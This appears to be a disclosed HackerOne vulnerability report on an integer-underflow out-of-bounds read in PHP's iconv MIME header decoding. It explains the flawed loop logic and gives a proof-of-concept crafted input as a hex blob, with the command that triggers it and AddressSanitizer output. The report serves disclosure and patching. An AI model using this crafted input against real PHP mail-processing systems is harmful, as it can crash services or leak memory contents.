# Out-of-bounds read in iconv.c:_php_iconv_mime_decode() due to integer overflow

## Report Details
- **Report ID**: 593229
- **URL**: https://hackerone.com/reports/593229
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-05-31T09:58:15.693Z
- **Disclosed**: 2020-10-12T10:51:39.074Z

## Reporter
- **Username**: neural_x
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
PHP upstream bug report: https://bugs.php.net/bug.php?id=78069

*Description:*
In _php_iconv_mime_decode() function in iconv.c, there's an out-of-bounds read due to an integer overflow vulnerability. MIME encoded string is being parsed and decoded in for loop with following condition:
```
for (str_left = str_nbytes; str_left > 0; str_left--, p1++) {
```
Inside this for loop, it's possible for str_left to be decreased and p1 to be increased at the same time when scan_stat is equal to 2 (i.e. case 2 branch of the switch) and the given character set is unrecognized and ICONV_MIME_DECODE_CONTINUE_ON_ERROR is specified, so it continues to parse the message. It will then try to skip the encoded word by searching for the other two '?' characters while increasing p1 and decreasing str_left:
```
int qmarks = 2;
while (qmarks > 0 && str_left > 1) {
    if (*(++p1) == '?') {
        --qmarks;
    }
    --str_left;
}
```
If the while condition is stopped, it will proceed to the next condition that checks if the next character is '=' and if it is, p1 is increased again and str_left is decreased: 
```
if (*(p1 + 1) == '=') {
    ++p1;
    --str_left;
}
```
However, if the previous while loop was stopped due to str_left being equal to 1, it is now decreased to 0. The encoded string is copied to 'pretval' variable and if it doesn't error out, it will properly set scan_stat and break:
```
scan_stat = 12;
break;
```
The for loop is being run from start again, but before checking the condition 'str_left > 0', it is first decreased. Since it was already equal to 0 and it is defined as size_t (i.e. unsigned integer), it will overflow to very huge positive number. At this point, the code will continue to read from p1 out of bounds and copy it to 'pretval'.

*PoC:*
```
$ echo "53754c743b2020304a70616100000d0d0d0d0d0d0d0d0d6563743a203d3f69730d0d0d0d0d0d0d0d0d0d0d0d0d0d0d6563743a203d3f6973754c743b2020304a70616100000d0d0d0d0d0d0d0d0d6563743a203d3f6f2d383835392d313f713f3c334633463d33463f3da2" | xxd -r -p - > poc

$ sha256sum poc
c471fb3e1511897d3fda9095e0eb85c934532a207f30ac99f0e7d58c42916e4b  poc

$ USE_ZEND_ALLOC=0 sapi/cli/php -r '$hdr = iconv_mime_decode_headers(file_get_contents("poc"),2);'
=================================================================
==26444==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60d0000005a8 at pc 0x000000a2ee39 bp 0x7ffcc313a470 sp 0x7ffcc313a460
READ of size 1 at 0x60d0000005a8 thread T0
    #0 0xa2ee38 in _php_iconv_mime_decode /home/neural.x/Projects/php-7.3.5/ext/iconv/iconv.c:1965
    #1 0xa332c6 in zif_iconv_mime_decode_headers /home/neural.x/Projects/php-7.3.5/ext/iconv/iconv.c:2409
    #2 0x159adb7 in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER /home/neural.x/Projects/php-7.3.5/Zend/zend_vm_execute.h:690
...
```
This issue affects all current stable releases, namely PHP-7.1.29, PHP-7.2.18, and PHP-7.3.5. Tested on Fedora 28, PHP code was compiled with ASAN. It is possible to observe the bug also with valgrind without the necessity of compilig php with ASAN.

## Impact

Remote attacker can submit specially crafted MIME format message (email) which triggers the vulnerability in the parsing code when decoding MIME headers. Possible impact is crash of the application or even information leak, depending on the further usage of the decoded header since it contains the data from memory outside of allocated string. The exact behaviour depends on the content of the memory after 'str' buffer.

## Attachments
No attachments
